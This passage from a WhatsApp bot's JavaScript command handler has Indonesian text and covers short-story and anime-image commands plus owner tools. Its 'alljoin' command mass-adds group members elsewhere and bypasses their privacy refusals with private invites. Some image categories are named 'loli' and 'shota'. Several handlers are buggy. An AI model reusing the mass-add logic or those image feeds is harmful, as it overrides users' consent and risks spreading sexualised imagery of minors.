❏ *Story*: ${hasil.cerita}`, { quoted: fkontak1 })
}
break
case 'cerpen-perjuangan':{
let hasil = await cerpen(`perjuangan`, { quoted: fkontak1 })
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, { quoted: fkontak1 })
}
break
case 'cerpen-perpisahan':{
let hasil = await cerpen(`perpisahan`, { quoted: fkontak1 })
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, { quoted: fkontak1 })
}
break
case 'cerpen-persahabatan':{
let hasil = await cerpen(`persahabatan`, { quoted: fkontak1 })
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, { quoted: fkontak1 })
}
break
case 'cerpen-petualangan':{
let hasil = await cerpen(`petualangan`, { quoted: fkontak1 })
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, { quoted: fkontak1 })
}
break
case 'cerpen-ramadhan':{
let hasil = await cerpen(`ramadhan`, { quoted: fkontak1 })
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, { quoted: fkontak1 })
}
break
case 'cerpen-remaja':{
let hasil = await cerpen(`remaja`, { quoted: fkontak1 })
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, { quoted: fkontak1 })
}
break
case 'cerpen-rindu':{
let hasil = await cerpen(`rindu`, { quoted: fkontak1 })
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, { quoted: fkontak1 })
}
break
case 'cerpen-rohani':{
let cerpe = await cerpen(`rohani`, { quoted: fkontak1 })
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, { quoted: fkontak1 })
}
break
case 'cerpen-romantis':{
let hasil = await cerpen(`romantis`, { quoted: fkontak1 })
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, { quoted: fkontak1 })
}
break
case 'cerpen-sastra':{
let hasil = await cerpen(`sastra`, { quoted: fkontak1 })
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, { quoted: fkontak1 })
}
break
case 'cerpen-sedih':{
let hasil = await cerpen(`sedih`, { quoted: fkontak1 })
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, { quoted: fkontak1 })
}
break
case 'cerpen-sejarah':{
let hasil = await cerpen(`sejarah`, { quoted: fkontak1 })
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, { quoted: fkontak1 })
}
break
				//anime		
		case 'akira': case 'akiyama': case 'ana': case 'art': case 'asuna': case 'ayuzawa': case 'boruto': case 'bts': case 'chiho': case 'chitoge': case 'cosplay': case 'cosplayloli': case 'cosplaysagiri': case 'cyber': case 'deidara': case 'doraemon': case 'elaina': case 'emilia': case 'erza': case 'exo':  case 'gamewallpaper': case 'gremory': case 'hacker': case 'hestia': case 'hinata': case 'husbu': case 'inori': case 'islamic': case 'isuzu': case 'itachi': case 'itori': case 'jennie': case 'jiso': case 'justina': case 'kaga': case 'kagura': case 'kakasih': case 'kaori': case 'cartoon': case 'shortquote': case 'keneki': case 'kotori': case 'kurumi': case 'lisa': case 'madara': case 'megumin': case 'mikasa': case 'mikey': case 'miku': case 'minato': case 'mountain': case 'naruto': case 'neko2': case 'nekonime': case 'nezuko': case 'onepiece': case 'pentol': case 'pokemon': case 'programming':  case 'randomnime': case 'randomnime2': case 'rize': case 'rose': case 'sagiri': case 'sakura': case 'sasuke': case 'satanic': case 'shina': case 'shinka': case 'shinomiya': case 'shizuka': case 'shota': case 'space': case 'technology': case 'tejina': case 'toukachan': case 'tsunade': case 'yotsuba': case 'yuki': case 'yulibocil': case 'yumeko':{
m.reply(mess.wait)
let heyy
if (/akira/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akira.json')
if (/akiyama/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akiyama.json')
if (/ana/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ana.json')
if (/art/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/art.json')
if (/asuna/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/asuna.json')
if (/ayuzawa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ayuzawa.json')
if (/boneka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boneka.json')
if (/boruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boruto.json')
if (/bts/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/bts.json')
if (/cecan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cecan.json')
if (/chiho/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chiho.json')
if (/chitoge/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chitoge.json')
if (/cogan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cogan.json')
if (/cosplay/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplay.json')
if (/cosplayloli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplayloli.json')
if (/cosplaysagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplaysagiri.json')
if (/cyber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cyber.json')
if (/deidara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/deidara.json')
if (/doraemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/doraemon.json')
if (/eba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/eba.json')
if (/elaina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/elaina.json')
if (/emilia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/emilia.json')
if (/erza/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/erza.json')
if (/exo/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/exo.json')
if (/femdom/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/femdom.json')
if (/freefire/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/freefire.json')
if (/gamewallpaper/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gamewallpaper.json')
if (/glasses/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/glasses.json')
if (/gremory/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gremory.json')
if (/hacker/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hekel.json')
if (/hestia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hestia.json')
if (/husbu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/husbu.json')
if (/inori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/inori.json')
if (/islamic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/islamic.json')
if (/isuzu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/isuzu.json')
if (/itachi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itachi.json')
if (/itori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itori.json')
if (/jennie/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jeni.json')
if (/jiso/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jiso.json')
if (/justina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/justina.json')
if (/kaga/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaga.json')
if (/kagura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kagura.json')
if (/kakasih/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kakasih.json')
if (/kaori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaori.json')
if (/cartoon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kartun.json')
if (/shortquote/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/katakata.json')
if (/keneki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/keneki.json')
if (/kotori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kotori.json')
if (/kpop/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kpop.json')
if (/kucing/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kucing.json')
if (/kurumi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kurumi.json')
if (/lisa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/lisa.json')
if (/loli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/loli.json')
if (/madara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/madara.json')
if (/megumin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/megumin.json')
if (/mikasa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikasa.json')
if (/mikey/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikey.json')
if (/miku/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/miku.json')
if (/minato/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/minato.json')
if (/mobile/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mobil.json')
if (/motor/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/motor.json')
if (/mountain/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mountain.json')
if (/naruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/naruto.json')
if (/neko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/neko.json')
if (/neko2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/neko2.json')
if (/nekonime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nekonime.json')
if (/nezuko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nezuko.json')
if (/onepiece/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/onepiece.json')
if (/pentol/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pentol.json')
if (/pokemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pokemon.json')
if (/profil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/profil.json')
if (/progamming/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/programming.json')
if (/pubg/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pubg.json')
if (/randblackpink/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randblackpink.json')
if (/randomnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime.json')
if (/randomnime2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime2.json')
if (/rize/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rize.json')
if (/rose/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rose.json')
if (/ryujin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ryujin.json')
if (/sagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sagiri.json')
if (/sakura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sakura.json')
if (/sasuke/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sasuke.json')
if (/satanic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/satanic.json')
if (/shina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shina.json')
if (/shinka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinka.json')
if (/shinomiya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinomiya.json')
if (/shizuka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shizuka.json')
if (/shota/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shota.json')
if (/space/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tatasurya.json')
if (/technology/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/technology.json')
if (/tejina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tejina.json')
if (/toukachan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/toukachan.json')
if (/tsunade/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tsunade.json')
if (/waifu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/waifu.json')
if (/wallhp/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallhp.json')
if (/wallml/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallml.json')
if (/wallmlnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallnime.json')
if (/yotsuba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yotsuba.json')
if (/yuki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yuki.json')
if (/yulibocil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yulibocil.json')
if (/yumeko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yumeko.json')
let yeha = heyy[Math.floor(Math.random() * heyy.length)]
Xlesy.sendMessage(m.chat, { image: { url: yeha }, caption : mess.success }, { quoted: fkontak1 })
}
break
		
											    				    case 'animecari': {
        await Xlesy.sendMessage(m.chat, { react: { text: '🔍', key: m.key } })
         // Example .animecari Naruto 
        searchAnime(Xlesy, m, text)
        }
            break

		
				// Owner Menu
case 'alljoin': {
    if (!m.isGroup) return m.reply('Fitur ini hanya bisa digunakan dalam grup!');
    if (!isCreator) return m.reply('Hanya owner bot yang bisa menggunakan fitur ini!');
    if (!m.isBotAdmin) return m.reply('Bot harus menjadi admin untuk menggunakan fitur ini!');

    let linkGc = args[0]; // Link grup tujuan
    if (!linkGc || !linkGc.includes('chat.whatsapp.com')) return m.reply('Masukkan link grup yang valid!');

    let metadata = await Xlesy.groupMetadata(m.chat);
    let participants = metadata.participants.map(u => u.id);

    // Ambil kode undangan dari link grup
    let groupCode = linkGc.split('chat.whatsapp.com/')[1];

    try {
        for (let member of participants) {
            try {
                let res = await Xlesy.groupParticipantsUpdate(groupCode, [member], "add");
                for (let i of res) {
                    let invv = await Xlesy.groupInviteCode(groupCode);

                    if (i.status == 401) {
                        m.reply(`⚠️ @${member.split('@')[0]} memblokir bot!`, { mentions: [member] });
                    } else if (i.status == 409) {
                        m.reply(`✅ @${member.split('@')[0]} sudah ada di grup tujuan!`, { mentions: [member] });
                    } else if (i.status == 500) {
                        m.reply(`⚠️ Grup tujuan penuh, tidak bisa menambahkan @${member.split('@')[0]}!`, { mentions: [member] });
                    } else if (i.status == 408) {
                        await m.reply(`@${member.split('@')[0]} baru saja keluar dari grup ini!\n\nKarena pengaturan privasi, undangan akan dikirimkan ke:\n-> wa.me/${member.replace(/\D/g, '')}\nMelalui jalur pribadi.`, { mentions: [member] });
                        await Xlesy.sendMessage(member, { text: `🔗 *Undangan Grup Baru*\nAdmin: @${m.sender.split('@')[0]}\nMengundang anda ke grup ini.\nSilakan masuk melalui link berikut:\nhttps://chat.whatsapp.com/${invv}`, mentions: [m.sender] });
                    } else if (i.status == 403) {
                        let a = i.content.content[0].attrs;
                        await Xlesy.sendGroupInvite(groupCode, member, a.code, a.expiration, metadata.subject, `Admin: @${m.sender.split('@')[0]}\nMengundang anda ke grup ini\nSilakan masuk jika berkehendak 🙇`, null, { mentions: [m.sender] });
                        m.reply(`@${member.split('@')[0]} tidak dapat ditambahkan karena privasi!\nUndangan telah dikirimkan secara pribadi.`, { mentions: [member] });
                    } else if (![200, 401, 409, 500].includes(i.status)) {
                        m.reply(`⚠️ Gagal menambahkan @${member.split('@')[0]} ke grup tujuan!`, { mentions: [member] });
                    }
                }
            } catch (err) {
                console.error(`Gagal menambahkan ${member}: ${err}`);
            }
            await new Promise(resolve => setTimeout(resolve, 5000)); // Tunggu 5 detik untuk menghindari blokir
        }

        m.reply('✅ Semua anggota yang bisa ditambahkan telah masuk ke grup baru!');
    } catch (error) {
        console.error(error);
        m.reply('⚠️ Gagal menambahkan anggota ke grup. Pastikan bot adalah admin di grup tujuan!');
    }
}
break;
case "creatgc": {
    if (!isOwner) return m.reply(msg.owner) // Hanya owner yang bisa pakai

    if (!text) return m.reply("Gunakan format: *.creatgc Nama Grup*", { quoted: fkontak1 })

    let groupName = text.trim() // Ambil nama grup dari teks input

    try {
        let group = await Xlesy.groupCreate(groupName, [m.sender]) // Buat grup dengan owner sebagai anggota
        let groupId = group.id

        await Xlesy.sendMessage(groupId, { text: `Grup *${groupName}* berhasil dibuat! ✅` })
        m.reply(`Grup *${groupName}* berhasil dibuat!`, { quoted: fkontak1 })

    } catch (e) {
        m.reply("Gagal membuat grup! Pastikan bot tidak dibatasi.", { quoted: fkontak1 })
    }
}
break		
			case 'setbio': {
				if (!isCreator) return m.reply(mess.owner)
				if (!text) return m.reply('Mana text nya?')
				Xlesy.setStatus(q)
				m.reply(`*Bio telah di ganti menjadi ${q}*`, { quoted: fkontak1 })
			}
			break
			case 'setppbot': {
				if (!isCreator) return m.reply(mess.owner)
				if (!/image/.test(quoted.type)) return m.reply(`Reply Image Dengan Caption ${prefix + command}`, { quoted: fkontak1 })
				let media = await Xlesy.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
				if (text.length > 0) {
					let { img } = await generateProfilePicture(media)
					await Xlesy.query({
						tag: 'iq',
						attrs: {
							to: '@s.whatsapp.net',
							type: 'set',
							xmlns: 'w:profile:picture'
						},
						content: [{ tag: 'picture', attrs: { type: 'image' }, content: img }]
					})
					await fs.unlinkSync(media)
					m.reply('Sukses')
				} else {
					await Xlesy.updateProfilePicture(botNumber, { url: media })
					await fs.unlinkSync(media)
					m.reply('Sukses')
				}
			}
			break
			case 'delppbot': {
				if (!isCreator) return m.reply(mess.owner)
				await Xlesy.removeProfilePicture(Xlesy.user.id)
				m.reply('Sukses')
			}
			break
case 'join': {
    if (!isCreator) return m.reply(mess.owner)
    if (!text) return m.reply('Masukkan Link Group!', { quoted: fkontak1 })
    if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return m.reply('Link Invalid!', { quoted: fkontak1 })
    
    const result = args[0].split('https://chat.whatsapp.com/')[1]
    m.reply(mess.wait)

    try {
        const response = await Xlesy.groupAcceptInvite(result)
        if (response) {
            m.reply('Bot berhasil join ke grup!', { quoted: fkontak1 })

            // Mengirim pesan ke grup setelah join
            let groupMetadata = await Xlesy.groupMetadata(response)
            let groupId = groupMetadata.id
            let welcomeMessage = `_Halo semua! Saya adalah bot yang siap membantu di grup ini. 🦖_`

            await Xlesy.sendMessage(groupId, { text: welcomeMessage }, { quoted: fkontak1 })
        }
    } catch (res) {
        if (res.data == 400) return m.reply('Grup Tidak Ditemukan❗', { quoted: fkontak1 })
        if (res.data == 401) return m.reply('Bot Di Kick Dari Grup Tersebut❗', { quoted: fkontak1 })
        if (res.data == 409) return m.reply('Bot Sudah Join Di Grup Tersebut❗', { quoted: fkontak1 })
        if (res.data == 410) return m.reply('URL Grup Telah Di Setel Ulang❗', { quoted: fkontak1 })
        if (res.data == 500) return m.reply('Grup Penuh❗', { quoted: fkontak1 })
    }
}
break
case 'leaveid':
    if (!isOwner) return m.reply("❌ *Hanya Owner yang bisa menggunakan perintah ini!*");
    if (!args[0]) return m.reply("⚠️ *Masukkan ID grup yang ingin ditinggalkan!*");

    let groupId = args[0];

    try {
        await Xlesy.groupLeave(groupId);
        await Xlesy.sendMessage(m.sender, { text: `✅ Berhasil keluar dari grup: ${groupId}` }, { quoted: fkontak1 })
    } catch (err) {
        await Xlesy.sendMessage(m.sender, { text: `❌ Gagal keluar dari grup!\n\nError: ${err}` }, { quoted: fkontak1 })
    }
    break
			case 'leave': {
				if (!isCreator) return m.reply(mess.owner)
				await Xlesy.groupLeave(m.chat).then(() => Xlesy.sendFromOwner(owner, 'Sukses Keluar Dari Grup', m, { contextInfo: { isForwarded: true }}))
			}		
			break
			case 'clearchat': {
				if (!isCreator) return m.reply(mess.owner)
				await Xlesy.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.timestamp }] }, m.chat)
				m.reply('Sukses Membersihkan Pesan', { quoted: fkontak1 })
			}
			break
			case 'blokir': case 'block': {
				if (!isCreator) return m.reply(mess.owner)
				if (!text && !m.quoted) {
					m.reply(`Contoh: ${prefix + command} 62xxx`, { quoted: fkontak1 })
				} else {
					const numbersOnly = m.isGroup ? (text ? text.replace(/\D/g, '') + '@s.whatsapp.net' : m.quoted?.sender) : m.chat
					await Xlesy.updateBlockStatus(numbersOnly, 'block').then((a) => m.reply(mess.done)).catch((err) => m.reply('Gagal!'))
				}
			}
			break
			case 'listblock': {
				let anu = await Xlesy.fetchBlocklist()
				m.reply(`Total Block : ${anu.length}\n` + anu.map(v => '• ' + v.replace(/@.+/, '')).join`\n`, { quoted: fkontak1 })
			}
			break
			case 'openblokir': case 'unblokir': case 'openblock': case 'unblock': {
				if (!isCreator) return m.reply(mess.owner)
				if (!text && !m.quoted) {
					m.reply(`Contoh: ${prefix + command} 62xxx`, { quoted: fkontak1 })
				} else {
					const numbersOnly = m.isGroup ? (text ? text.replace(/\D/g, '') + '@s.whatsapp.net' : m.quoted?.sender) : m.chat
					await Xlesy.updateBlockStatus(numbersOnly, 'unblock').then((a) => m.reply(mess.done)).catch((err) => m.reply('Gagal!'))
				}
			}
			break
			case 'adduang': {
				if (!isCreator) return m.reply(mess.owner)
				if (!args[0] || !args[1] || isNaN(args[1])) return m.reply(`Kirim/tag Nomernya!\nExample:\n${prefix + command} 62xxx 1000`, { quoted: fkontak1 })
				const nmrnya = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
				const onWa = await Xlesy.onWhatsApp(nmrnya)
				if (!onWa.length > 0) return m.reply('Nomer Tersebut Tidak Terdaftar Di Whatsapp!')
				if (db.users[nmrnya] && db.users[nmrnya].uang >= 0) {
					addUang(args[1], nmrnya, db)
					m.reply('Sukses Add Uang')
				} else {
					m.reply('User tidak terdaftar di database!')
				}
			}
			break
			case 'addlimit': {
				if (!isCreator) return m.reply(mess.owner)
				if (!args[0] || !args[1] || isNaN(args[1])) return m.reply(`Kirim/tag Nomernya!\nExample:\n${prefix + command} 62xxx 10`, { quoted: fkontak1 })
				const nmrnya = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
				const onWa = await Xlesy.onWhatsApp(nmrnya)
				if (!onWa.length > 0) return m.reply('Nomer Tersebut Tidak Terdaftar Di Whatsapp!', { quoted: fkontak1 })
				if (db.users[nmrnya] && db.users[nmrnya].limit >= 0) {
					addLimit(args[1], nmrnya, db)
					m.reply('Sukses Add limit', { quoted: fkontak1 })
				} else {
					m.reply('User tidak terdaftar di database!', { quoted: fkontak1 })
				}
			}
			break
			case 'listpc': {
				if (!isCreator) return m.reply(mess.owner)
				let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
				let teks = `● *LIST PERSONAL CHAT*\n\nTotal Chat : ${anu.length} Chat\n\n`
				if (anu.length === 0) return m.reply(teks)
				for (let i of anu) {
					if (store.messages[i] && store.messages[i].array && store.messages[i].array[0]) {
						let nama = store.messages[i].array[0].pushName
						teks += `${setv} *Nama :* ${nama}\n${setv} *User :* @${i.split('@')[0]}\n${setv} *Chat :* https://wa.me/${i.split('@')[0]}\n\n=====================\n\n`
					}
				}
				await m.reply(teks, { quoted: fkontak1 })
			}
			break
			case 'listgcbot':
    try {
        let groups = await Xlesy.groupFetchAllParticipating();
        let groupList = Object.values(groups).map((group) => {
            return `❏ *Nama:* ${group.subject}\n❏ *ID:* ${group.id}\n❏ *Member:* ${group.size}\n==========================`
        })

        let message = groupList.length > 0 ? `📌 *Daftar Grup yang Bot Bergabung:*\n\n${groupList.join("\n")}` : "❌ Bot tidak bergabung di grup manapun."
        
        await Xlesy.sendMessage(m.sender, { text: message }, { quoted: fkontak1 })
    } catch (err) {
        await Xlesy.sendMessage(m.sender, { text: `❌ Terjadi kesalahan!\n\nError: ${err}` }, { quoted: fkontak1 });
    }
    break
case 'listgc': {
    if (!isCreator) return m.reply(mess.owner)
    let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
    let teks = `● *LIST GROUP CHAT*\n\nTotal Group : ${anu.length} Group\n\n`
    if (anu.length === 0) return m.reply(teks)
    
    for (let i of anu) {
        let metadata;
        try {
            metadata = store.groupMetadata[i]
        } catch (e) {
            metadata = (store.groupMetadata[i] = await Xlesy.groupMetadata(i).catch(() => ({})))
        }
        
        if (metadata?.subject) {
            teks += `${setv} *Nama :* ${metadata.subject}\n`
            teks += `${setv} *Admin :* ${metadata.owner ? `@${metadata.owner.split('@')[0]}` : '-' }\n`
            teks += `${setv} *ID :* ${metadata.id}\n`
            teks += `${setv} *Dibuat :* ${moment(metadata.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n`
            teks += `${setv} *Member :* ${metadata.participants.length}\n`
            teks += `\n=====================\n\n`
        }
    }
    
    await m.reply(teks, { quoted: fkontak1 })
}
break
			case 'creategc': case 'buatgc': {
				if (!isCreator) return m.reply(mess.owner)
				if (!text) return m.reply(`Example:\n${prefix + command} *Nama Gc*`, { quoted: fkontak1 })
				let group = await Xlesy.groupCreate(q, [m.sender])
				let res = await Xlesy.groupInviteCode(group.id)
